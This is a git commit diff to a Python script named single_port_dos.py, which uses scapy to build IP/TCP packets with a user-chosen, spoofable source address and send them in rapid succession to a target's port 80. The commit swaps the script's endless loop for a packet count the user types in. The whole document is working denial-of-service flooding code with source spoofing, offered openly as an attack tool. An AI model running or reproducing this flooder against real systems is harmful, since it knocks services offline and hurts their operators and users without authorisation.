e60c9032da76f03a7f15fccea8561dc4a401bf91
José Lucas <jose.esbellute@gmail.com>
2022-02-27 14:54:00 -0300

    Getting the amount of packets to send to the target

--- DoS/SinglePort/single_port_dos.py
+++ DoS/SinglePort/single_port_dos.py
@@ -2,16 +2,25 @@ from scapy.all import *
 from scapy.layers.inet import IP
 from scapy.layers.inet import TCP
 
+#-------------------------------------------------------
 
 src = input("IP Origem: ")
 dst = input("IP Destino: ")
 sport = int(input("Porta de origem: "))
-i = 1
 
-while True:
+#-------------------------------------------------------
+
+i = 1
+packets = int(input("Quantidade de pacotes a enviar: "))
+
+#-------------------------------------------------------
+
+while i <= packets:
     IP1 = IP(src=src, dst=dst)
     TCP1 = TCP(sport=sport, dport=80)
     pkt = IP1 / TCP1
     send(pkt, inter=.001)
-    print("Enviado", i,  " Pacotes")
-    i = i + 1
+    print("Enviado [", packets, "] Pacotes")
+    i+=1
+
+#-------------------------------------------------------
